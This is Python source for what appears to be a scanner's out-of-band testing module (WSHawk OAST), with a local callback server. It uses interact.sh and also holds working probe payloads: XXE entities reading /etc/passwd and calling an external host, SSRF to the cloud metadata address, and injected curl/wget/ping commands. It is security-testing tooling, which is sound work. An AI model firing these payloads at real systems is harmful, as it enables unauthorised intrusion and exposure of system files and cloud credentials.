#!/usr/bin/env python3
"""
WSHawk OAST (Out-of-Band Application Security Testing) Module
Detects blind vulnerabilities using external callbacks
"""

import asyncio
import aiohttp
import hashlib
import time
import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import json

@dataclass
class OASTInteraction:
    """Represents an OAST interaction"""
    protocol: str  # dns, http, https
    full_id: str
    data: str
    timestamp: float

class OASTProvider:
    """
    OAST provider using interact.sh (or custom server)
    """
    
    def __init__(self, use_interactsh: bool = True, custom_server: Optional[str] = None):
        self.use_interactsh = use_interactsh
        self.custom_server = custom_server
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:12]
        self.domain = None
        self.interactions = []
        self.session = None
        self._correlation_id = None
        self._secret_key = None
        self._interactsh_base = "https://oast.fun"
        
    async def start(self):
        """Initialize OAST session — registers with interact.sh if enabled"""
        self.session = aiohttp.ClientSession()
        
        if self.use_interactsh:
            registered = await self._register_interactsh()
            if not registered:
                # Fallback to simple domain (DNS-only detection)
                self.domain = f"{self.session_id}.oast.fun"
                print(f"[OAST] Fallback mode — using domain: {self.domain}")
                print(f"[OAST] Tip: Run your own OAST server for full interaction polling")
        else:
            self.domain = self.custom_server
    
    async def _register_interactsh(self) -> bool:
        """
        Register with interact.sh public API to get a unique subdomain.
        """
        try:
            async with self.session.post(
                f"{self._interactsh_base}/register",
                json={"secret-key": self.session_id},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    self._correlation_id = data.get("correlationID", "")
                    self._secret_key = data.get("secretKey", self.session_id)
                    subdomain = data.get("subDomain", self._correlation_id)
                    self.domain = f"{subdomain}.oast.fun"
                    print(f"[OAST] Registered with interact.sh — domain: {self.domain}")
                    return True
                else:
                    print(f"[OAST] interact.sh registration failed (HTTP {resp.status})")
                    return False
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
            print(f"[OAST] interact.sh registration error: {e}")
            return False
    
    async def stop(self):
        """Close OAST session and deregister"""
        if self.session:
            # Attempt to deregister from interact.sh
            if self._correlation_id:
                try:
                    await self.session.post(
                        f"{self._interactsh_base}/deregister",
                        json={
                            "correlationID": self._correlation_id,
                            "secretKey": self._secret_key or self.session_id
                        },
                        timeout=aiohttp.ClientTimeout(total=5)
                    )
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
                    pass  # Best-effort cleanup
            await self.session.close()
    
    def generate_payload(self, vuln_type: str, test_id: str) -> str:
        """
        Generate OAST payload for specific vulnerability type
        """
        unique_id = f"{vuln_type}-{test_id}-{self.session_id}"
        
        payloads = {
            'xxe': f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{unique_id}.{self.domain}">]>
<root>&xxe;</root>''',
            
            'xxe_file': f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
            
            'ssrf': f'http://{unique_id}.{self.domain}',
            
            'ssrf_internal': f'http://169.254.169.254/latest/meta-data/',
            
            'rce_curl': f'curl http://{unique_id}.{self.domain}',
            
            'rce_wget': f'wget http://{unique_id}.{self.domain}',
            
            'rce_ping': f'ping -c 1 {unique_id}.{self.domain}',
        }
        
        return payloads.get(vuln_type, f'http://{unique_id}.{self.domain}')
    
    async def check_interactions(self, test_id: str, timeout: int = 5) -> List[OASTInteraction]:
        """
        Poll interact.sh API for interactions matching the test_id.
        """
        # Wait for potential callback
        await asyncio.sleep(timeout)
        
        # Poll interact.sh API if we have a correlation ID
        if self._correlation_id and self.session:
            try:
                params = {
                    "id": self._correlation_id,
                    "secret": self._secret_key or self.session_id
                }
                async with self.session.get(
                    f"{self._interactsh_base}/poll",
                    params=params,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        raw_interactions = data.get("data", []) or []
                        
                        for entry in raw_interactions:
                            interaction = OASTInteraction(
                                protocol=entry.get("protocol", "dns") if isinstance(entry, dict) else "dns",
                                full_id=entry.get("full-id", str(entry)) if isinstance(entry, dict) else str(entry),
                                data=entry.get("raw-request", "") if isinstance(entry, dict) else str(entry),
                                timestamp=time.time()
                            )
                            self.interactions.append(interaction)
                            
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError, json.JSONDecodeError) as e:
                print(f"[OAST] Polling error: {e}")
        
        # Filter interactions for this specific test
        matching = [i for i in self.interactions if test_id in i.full_id]
        return matching if matching else self.interactions
    
    def has_interaction(self, test_id: str) -> bool:
        """Check if specific test received callback"""
        return any(test_id in interaction.full_id for interaction in self.interactions)

class SimpleOASTServer:
    """
    Simple local OAST server for testing
    """
    
    def __init__(self, port: int = 8888):
        self.port = port
        self.interactions = []
        self.server = None
        self.app = None
        
    async def start(self):
        """Start OAST callback server"""
        from aiohttp import web
        
        async def handle_callback(request):
            """Handle incoming OAST callback"""
            interaction = OASTInteraction(
                protocol='http',
                full_id=request.path,
                data=await request.text(),
                timestamp=time.time()
            )
            self.interactions.append(interaction)
            print(f"[OAST] Received callback: {request.path}")
            return web.Response(text="OK")
        
        self.app = web.Application()
        self.app.router.add_route('*', '/{tail:.*}', handle_callback)
        
        runner = web.AppRunner(self.app)
        await runner.setup()
        self.server = web.TCPSite(runner, 'localhost', self.port)
        await self.server.start()
        
        print(f"[OAST] Server listening on http://localhost:{self.port}")
    
    async def stop(self):
        """Stop OAST server"""
        if self.server:
            await self.server.stop()
    
    def get_interactions(self) -> List[OASTInteraction]:
        """Get all interactions"""
        return self.interactions
    
    def clear_interactions(self):
        """Clear interaction history"""
        self.interactions = []

async def test_oast():
    """Test OAST functionality"""
    print("Testing OAST Module...")
    
    # Start local OAST server
    server = SimpleOASTServer(port=8888)
    await server.start()
    
    # Create OAST provider
    provider = OASTProvider(use_interactsh=False, custom_server="localhost:8888")
    await provider.start()
    
    # Generate payloads
    xxe_payload = provider.generate_payload('xxe', 'test1')
    ssrf_payload = provider.generate_payload('ssrf', 'test2')
    
    print(f"\n[OK] XXE Payload generated: {xxe_payload[:80]}...")
    print(f"[OK] SSRF Payload generated: {ssrf_payload}")
    
    # Simulate callback
    async with aiohttp.ClientSession() as session:
        try:
            await session.get(f'http://localhost:8888/xxe-test1-callback')
        except (aiohttp.ClientError, OSError):
            pass
    
    await asyncio.sleep(1)
    
    # Check interactions
    interactions = server.get_interactions()
    print(f"\n[OK] Received {len(interactions)} interaction(s)")
    for interaction in interactions:
        print(f"  - {interaction.protocol}: {interaction.full_id}")
    
    await provider.stop()
    await server.stop()
    print("\nOAST Test complete!")

if __name__ == "__main__":
    asyncio.run(test_oast())
